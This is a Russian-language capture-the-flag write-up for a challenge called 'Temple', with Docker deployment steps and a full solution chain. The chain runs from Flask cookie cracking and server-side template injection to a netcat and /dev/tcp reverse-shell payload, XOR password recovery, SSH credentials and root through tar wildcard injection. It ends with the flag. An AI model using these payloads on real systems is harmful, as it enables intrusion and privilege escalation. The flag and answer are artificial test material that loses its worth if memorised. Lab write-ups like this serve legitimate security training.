
# Temple 

<img width="835" alt="image" src="https://github.com/user-attachments/assets/12368280-ce87-44f7-ba0b-554d57d854bd">



# Сложность: Hard

# Описание:
Джунгли хранят в себе жуткие тайны...

# Deployment
Сборка образа:
```
docker build -t temple .
```
Запуск контейнера:
```
docker run -p 5555:80 6001:22 temple
```

# Writeup

Регистрируем пользователя, попадаем на страницу home.html, которая не содержит в себе какой-либо полезной информации. 
В cookies находим session, сбрутим, посмотрим, что в ней лежит:

```
python3 -m flask_unsign -u --wordlist=/usr/share/wordlists/rockyou.txt --cookie '.eJyrViotTi2KT0ksSVSyUqqOAXPzEnNTY5SsFGKUMlJzcvJjlHSAzMxin_z09NQUzzyIVElRKVBRrVItAAsiFnQ.Zrxgrw.v3aI7uJrATw4jedeIVqAkCdi41Q' --no-literal-eval
```

Видим, что кука небогата на данные: юзернейм и статус isLoggedIn
<img width="626" alt="image" src="https://github.com/user-attachments/assets/12cb2ecd-144d-4c3c-8b20-dc7932cd00ab">


Вспомним, что в заголовке server http-ответа красуется werkzeug/python => Flask, думаем в сторону SSTI. 
Повлиять можем на имя пользователя – регнем нового с юзернеймом {{7*7}} и снова сбрутим куку:
<img width="612" alt="image" src="https://github.com/user-attachments/assets/a2748cea-a864-44ab-8272-83fd46669313">


Ага, в ключе username видим 49, таким образом, подтверждаем наличие SSTI. 
Регистрируем пользователя с реверс шелл нагрузкой в юзернейме, например: 

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f" | base64

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5qcC5uZ3Jvay5pby8xMzA0NCAwPiYx" | base64 -d | bash').read() }}
```


Находясь в системе под пользователем app, находим в директории quentin файл notes.txt, прочитать который мы не можем, и бинарный файл, принадлежащий тому же юзеру. 
Проверим sudoers:

```
app@b28f5c2c35fb:/home/quentin$ sudo -l
Matching Defaults entries for app on b28f5c2c35fb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User app may run the following commands on b28f5c2c35fb:
    (ALL) NOPASSWD: /home/quentin/notes
```
Ага, можем под sudo запускать данный бинарь без пароля, посмотрим что там внутри. 

Файл приветствует пользователя и запрашивает пароль, пароль нам неизвестен – попробуем выяснить. 
Грузим себе и начинаем реверсить 

<img width="849" alt="image" src="https://github.com/user-attachments/assets/a31081c7-1274-4857-b248-2e606583b2eb">


Видим, что бинарный файл проверяет пароль и, в случае его соответствия, выполняет системный вызов cat notes.txt

<img width="533" alt="image" src="https://github.com/user-attachments/assets/7c625c92-3d23-4d24-a4b3-f6c392a41837">


Прежде чем приступить к сравнению, вызывается некая функция encrypt_decrypt(), проверим её содержимое:

<img width="316" alt="image" src="https://github.com/user-attachments/assets/1a4fbefe-e72b-4570-83ce-8cc1cc4812b0">


Таким образом, зашифрованный пароль ксорится с 0xAC, после чего пользовательский ввод сравнивается с расшифрованным паролем. 
Найдем внутри бинаря массив с зашифрованными байтами пароля:

<img width="785" alt="image" src="https://github.com/user-attachments/assets/e3a92c72-1204-4b2c-b9f2-286acc73661d">


Пишем дешифратор, в данном случае приведена реализация на python:

```
xor_key = 0xAC
encrypted_password = b'\xdb\xc4\x98\xd8\xf3\xcd\xf3\xdb\x9c\xc2\xc8\xc9\xde\xca\xd9\xc0\xf3\xc0\xc5\xca\xc9'
decrypted_password = bytes([b ^ xor_key for b in encrypted_password])
print(decrypted_password.decode())
wh4t_a_w0nderful_life

```
Получив пароль, запускаем файл на сервере, вводим полученную строку и достаем из notes.txt креды от ssh:

```
quentin:w3lc0m3_to_th3_T3mPL3!
```

Цепляемся по ssh:

```
ssh quentin@example.com -p PORT
```

Забираем первую часть флага и изучаем, где оказались. В директории /opt находим скрипт backup.sh, его содержимое: 

```
#!/bin/bash
touch /var/log/cron.log
crontab /etc/cron.d/backup
cd /home/quentin
tar -czf /backups/backup.tar.gz *
```

Эту же задачу находим в /etc/cron.d/backup:

<img width="457" alt="image" src="https://github.com/user-attachments/assets/b2f3bb31-7512-46fd-85a9-72a48106078a">


Проверив директорию backups, убеждаемся, что бекап создается рутом, следовательно и задача выполняется от рута:

<img width="588" alt="image" src="https://github.com/user-attachments/assets/37e9700a-0ae8-42ee-a7c1-42aa84336ca3">


Внимательно изучив скрипт, можно увидеть вектор повышения привилегий через tar – Wildcard injection.

Для повышения привилегий сделаем следующее:
- Переместимся в директорию /home/quentin, содержимое которой и передается в tar:
  
  ```
  cd /home/quentin
  ```
  
- Создадим небольшой скрипт, который будет копировать бинарник /bin/bash и присваивать ему suid, назовем его tql.sh:
  
  ```
  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > tql.sh
  ```
  
- Создадим файл --checkpoint, который и станет нашей инъекцией:
  
  ```
  touch /home/quentin/--checkpoint=1
  touch /home/quentin/--checkpoint-action=exec=sh\ tql.sh
  ```
  
- Ждем минуту, пока крон сделает свое дело и проверяем директорию /tmp:

<img width="595" alt="image" src="https://github.com/user-attachments/assets/a0adf71d-0ef1-4418-9870-0c0da8cfdfbc">


- Запускаем /tmp/bash с сохранением прав, забираем рута и вторую часть флага
  
  ```
  quentin@66a45affd54c:/app$ /tmp/bash -p
  bash-5.1# id
  uid=1000(quentin) gid=1000(quentin) euid=0(root) egid=0(root) groups=0(root),1000(quentin)
  ```

## Ответ:
### tqlCTF{4_h1dd3n_t3mpL3_h1d3s_d4ng3r0us_s3cr3ts}
